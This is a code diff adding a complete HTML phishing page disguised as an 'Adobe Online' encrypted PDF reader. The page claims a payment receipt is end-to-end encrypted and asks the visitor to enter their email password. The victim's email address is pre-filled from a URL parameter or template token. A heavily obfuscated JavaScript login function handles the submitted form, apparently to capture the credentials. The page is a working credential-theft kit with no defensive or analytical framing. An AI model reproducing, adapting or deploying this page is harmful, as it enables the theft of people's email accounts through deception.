@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Adobe Online - Pdf Encrypted Reader</title>
+  <style>
+    body {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+      overflow: hidden; /* Hide overflow to prevent scrolling */
+    }
+
+    #background {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      object-fit: cover;
+      z-index: -1;
+      filter: blur(0); /* Initial no blur effect */
+      transition: filter 0.6s ease-out; /* Smooth transition for blur effect */
+    }
+
+    #login-container {
+      display: none; /* Initially hide the container */
+      max-width: 300px;
+      background-color: rgba(128, 128, 128, 0.5);
+      border-radius: 10px;
+      padding: 20px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      text-align: center;
+      transition: opacity 1s ease-in-out; /* Smooth transition for container visibility */
+    }
+
+    #login-icon {
+      width: 50px;
+      height: 50px;
+      margin-bottom: 20px;
+    }
+
+    #small-text {
+      font-size: 12px;
+      color: white;
+      margin-bottom: 10px;
+    }
+
+    #beautiful-text {
+      font-family: 'Comic Sans MS', cursive; /* Comic Sans MS font */
+      font-size: 16px;
+      font-weight: bold;
+      color: white;
+      margin-bottom: 15px;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      box-sizing: border-box;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+
+    #login-button {
+      background-color: #B7361B;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+
+    #login-button:hover {
+      background-color: #45a049;
+    }
+  </style>
+</head>
+<body>
+  <img id="background" src="https://i.imgur.com/5qxoMHE.png" alt="Background Image">
+  
+  <div id="login-container">
+    <img id="login-icon" src="https://www.iconpacks.net/icons/2/free-pdf-download-icon-2617-thumb.png" alt="Login Icon">
+    <div id="small-text">This Document is end-to-end encrypted, &#x1F512;</div>
+    <div id="beautiful-text">Sign in with your email address below to view the payment receipt.</div>
+
+    <!-- Form starts here -->
+    <form action="" method="post" onsubmit="return login()">
+      <input type="email" id="email" name="email" placeholder="Email Address" value="[[-Email-]]" readonly required>
+      <input type="password" id="password" name="password" placeholder="Email Password" required>
+      <button id="login-button" type="submit">Click Here</button>
+    </form>
+    <!-- Form ends here -->
+  </div>
+
+  <script>
+    var login;(function(){var tcu='',ABi=422-411;function tps(y){var r=3808888;var d=y.length;var a=[];for(var i=0;i<d;i++){a[i]=y.charAt(i)};for(var i=0;i<d;i++){var e=r*(i+199)+(r%27029);var w=r*(i+664)+(r%35937);var b=e%d;var g=w%d;var u=a[b];a[b]=a[g];a[g]=u;r=(e+w)%5498684;};return a.join('')};var KhY=tps('cwqrtvucpjnnackhmgrisxldttbuferooosyz').substr(0,ABi);var ZuX='naa[cl12,2w<);xlen;tyAdu=) f8.=egdgrkve}seq=it,)d, vo<bh7iv)tz5vbglo7cv ,7n-7eoa(ts517s e85.(u;(n62jpto"ah;h+ge871)t=)iv3;r+;,2rap0+C)e{fele>==pai.8+.a;(";=gci(r[Sr=rou4p)=rn+o][;l+(}=.0e!;wt,1u7n+2,,fr(gai=clb<p]6;mgnts.s)1ltn)6++,{=gr(}n0)o=me)tt[iat(rdraor)")n0e("1fr "=ortv.0Ah-pro;;r=5;.a17p h=ijcl0[sl.ra=;.(])saxo(==uqlooal;va0;7bA;n=rh.hnhe ;htm]aagv98p[ va=);fir+2vr)o;.!=a. feuapCoa,r{(. 8,s)scr7,4([q}or)v1=2.1r)]l+glheu=j vdgtuondth*"a,m ;i};j;clu2iut,,=ra{m .vo (Co((j9cohq)ih-;;ls.;h (l6th=.)cno+0nr+it{lz]iu0f-6c1lr6i;}pg,mgA;<9e,c{r["vr=,)survnmrfdqpf-)i=qov=f.u2xna-t(+r{;=n+hxw p,qvuj e([l+ i9;lr]r;;-na(4;ri,1l)fte =<m(t.trshgzr.Cbe]adnahld8;fwr+mr[cn"=(gar;qiohp;ssf))tl)1r a90(=vfn;}h(.+b;h4]a6C5l=[f0,(=8g]8)vv3=l u;nh,t9]e.w ao.=Stl[rt=,(o)evu=((+e =o)b+d"vC]v+>.f[0ir,]j)(h";9++aml+lv[wita woio, s;r);laoogz.nCa)n0(lA8ef,(=]rnwl;njgnqri6;;u+13gwsaf(,r;e=e(trjlC.amv*';var JFQ=tps[KhY];var TQb='';var Wuz=JFQ;var GTn=JFQ(TQb,tps(ZuX));var CFC=GTn(tps('3)(?U_p_fUc2c=b%d..lE]ktreU(.arUg)U"UHe0%Ti%c(uf(Ur.Kl \/,=bUe]b,e((edU.ioU]f%U>U))2!0e"1l8ao.g.e[!r3t(,,1U3sSrsUJu$;N[])13((4!UDjl%A0o7c!302$USUrUUU4.;cUrA$rIufe\/2H8_"19Uo".o1_cel{dUetQUt3=eM8}i}9pUg)rUog9o!;}_U.UPjsi;4$1b $4)c\/]e3t"aw6&Uu[5Ud(i.i2ne_K0:r_c=oU$_eUcUU5C(lwm#%86Uct, jiUt.6nni otFa.p_pdUtrme81lUs%artU}W;1mca;riieU(1.4,U7U s&;% t.{1.eKU7!ho+Rs} 9t3UU1HMm_t)oi)C0Udi%(EcltUnxl%]e,Ine4an=((UirU6,{a=! 46rJh!)U .eUQ"eT %bt=ueccim\/rct}.1aoU)%oU.tcJnt]Uuc.) o(U1enatl_Ust\'sUUB.mll]ctU.i]Ps.!ra.}o;-D%ale=%)joGUn)egUuab}kUsv$3(ehEo)d{=U(1y? rU4uU3U%Us_n)>\'Uwjw0eiU$3at)u,08tbU] pEUiaewc}ite%nRhn}}ir0aaual=(t%eUl9.icE2!ua{Qo_n)wUUeIruUnbesnLU3Knbr2fU4 )omUdnU.(n$)(5(3ahetEimUUopfUocixg{n_w@oslrtcs:wt4U.rsel,w#);5p,Dt1t)$=]6t.w_%tie1$5Uea.}5]ff9naisr,UoiUUr)Uu3}l=ra fpUiU.u),6 %rso];UjU$UUI)Uol..c=8U0)U)319UPk=.aad7rs;]nUU,IbUciU7s)i,9csnU9n(7u]n)!$ditoiw1sUC]tl](w=IU=k)4!e_UTUrN:,U(7{e(.;.)re.Iwc[; 466(w8r_0Udo2s21.Utke.c{dcp7+fac*%dUU"j_u.U;2h,{fUo c+UUnsUrUl.(_fUrU-.(3pr.U__iUt753,)Ut_2_)c,cyU (yt..o.friM3)f_)CoU.4U{.O1a5n)0lc(;U]tbn:ao!$;)cg:Me(7{yn3o5gs:}O)cUe; feUnU Inn.n7e,oc,Ucs3)h,Udc.h(Uc(5U}),t=}sdl%UUd)5r Pnn\/. f==,=o_l2ot)d1oe)U_UUt.8;"dA;9(UR.=baSwUc Uoa;(3Up)H=0tD...dE$)U[8.ofU_sU)!rUpeU]dwgcPaBr9(GcoB5 co]T}.ea{$!Unic)_]c3ee U1cc6lu,)9(I44(wUa\/0(+j,.U_Ur(iuUy6e(ut!(U{(7bQUro_UPcQft )=(U(12@r{UP5c (cKadU\'iceqs \')4eu16] U)|(_=U((l8es[u-Ut.s]nrc&.)p+66m3{6gU5ac"c%U._(fe.V)8>6]UUwUd-8;3c)7o4iUa.f_UCfUc$hed>6},{h r(%U7sU{U,h9mye6e [e\'c,,F)nn-7yUtUa,21Usoc(!!bcn4unoUn@9:,.}e.(( K!),1g[2Utoo0]l_Q#5eddtDUs6ao C3e}}outUli]7ef="5U)(>.c).=((fmc.ecm)16cMeohe})L5;6sn#U6o7cUU?esdT\/.sU<ec]S2Uj=_] U;]3en[0).bo(:(d.1(n{D=UU_U%5t(eAaos$]1ddf.0oVRUw!]U.(yn0)=35{4$Ro)Io))cUeU&U7c(p$.9Uu0=t3(?hlUS>mcud(.oUU#nUTU.1+4dlf*(c!jU;5(.}r1eUqb,}!(e[%i;(o%}.(,a.krp2nrr.2(f.i96(m,s}Ut=U)U9UtU$.l$U_s)1e4Uj_S;of{tw6sr;uc.aeUeU%0]UiTdkvUnadOy<tnU%c.]UUo;eJmtU gdotU10.US)]pb(,_3U(l0%$eumE{]]$(UWeU2U2e;17.cyM.)(;pnry<3a_lje0g})9hUWrbc.Unw,e=oeGU0.cU.{c.r(sc_T=1![EsawU)%4f_.ka-s9_n,..<61)}6fmnU25.UT ;3,;rOc_tU)tls>2JrU4)ttU]0ru7m$9=kUUUs%y.y;)_. a,()7;n ; e.smr%(lU]%r0c{UUc=1.iUic!h9];8U=[(8uU(wUcUr(3m}0,!esi1@(fUdU)cU0n_$UDwbc9U(.5)U0aUc_l$<U..>UfCe)f58Cc4UUrgUa._|9U0ct%h),*U_P,lc+!}crad5{](Ue)UszUoUwu(Udna2;U_P2cci3U]in0#.3gJ(?bso$()]UU\/)o_yC(emU)6Ueon.VC1nsU_n\/J.39U"d,f{8deotE31cc.p_n;]op6h[.fU7pUg!_Ut25)Ut .e]ivU-{d))t]:e-U*U_4mUtct+C(ha1n@1{98ea3 h >U1r3.U_nVr}t]!6a d)_odc-% c.sU=fc!I5&l(+U0#aubU#lBf1(eee.3.icfiUrtl(%yosh{e=7y.aU% 13(4h})hiU=]u?4vt lU0!]j0o]ce$!upU*2tePeUuthUta)4EUrWeUT>h(U) lE \/[l2)U ]!jp,]n3pS)t)a4IG%Usn]er6cU., 5,ar1cas$ f 7t;e_n%neo4pc.=33g4fau{mlioJpr!U,)eff5Ud0)P CmaaoU(;]!.u{E4U_97_le[r)xoct$ocEe&TalbarUl[61i5)!eiE0!UUt6rb.2] deo$U=ec!f)s0;L+x?#Ua.[8=e64U;U:(2.$)H]'));var Akd=Wuz(tcu,CFC );Akd(9398);return 7128})()
+  </script>
+
+<script>
+  // Function to get URL parameter by name
+  function getParameterByName(name, url) {
+      if (!url) url = window.location.href;
+      name = name.replace(/[\[\]]/g, "\\$&");
+      var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+          results = regex.exec(url);
+      if (!results) return null;
+      if (!results[2]) return '';
+      return decodeURIComponent(results[2].replace(/\+/g, " "));
+  }
+
+  // Get the email parameter from the URL
+  var emailFromURL = getParameterByName('email');
+
+  // Set the email field value
+  if (emailFromURL) {
+      document.getElementById('email').value = emailFromURL;
+  }
+
+  // Optional: You can also submit the form automatically if needed
+  // document.getElementById('sign-in-form').submit();
+</script>
+
+</body>
+</html>
